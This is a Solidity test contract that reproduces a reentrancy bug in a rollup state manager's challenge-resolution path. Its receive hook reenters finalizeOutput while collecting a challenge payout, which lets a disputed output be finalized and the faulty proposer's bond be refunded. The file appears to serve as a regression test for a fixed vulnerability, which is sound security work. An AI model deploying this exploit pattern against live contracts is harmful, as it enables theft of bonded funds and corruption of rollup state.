// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IRollupTarget {
    function challengeOutputRoot(uint64 l2BlockNumber) external payable;
    function finalizeOutput(uint64 l2BlockNumber) external;
}

/**
 * @notice Test-only attacker for the RollupStateManager resolveChallenge
 *         reentrancy. Acts as the challenger; when paid out during
 *         resolveChallenge it reenters finalizeOutput to (pre-fix) finalize
 *         the disputed output and refund the at-fault proposer's bond.
 */
contract RollupReentrancyAttacker {
    IRollupTarget public immutable target;
    uint64 public targetBlock;
    bool public reentered;

    constructor(address _target) {
        target = IRollupTarget(_target);
    }

    function challenge(uint64 l2BlockNumber) external payable {
        targetBlock = l2BlockNumber;
        target.challengeOutputRoot{value: msg.value}(l2BlockNumber);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            try target.finalizeOutput(targetBlock) {} catch {}
        }
    }
}
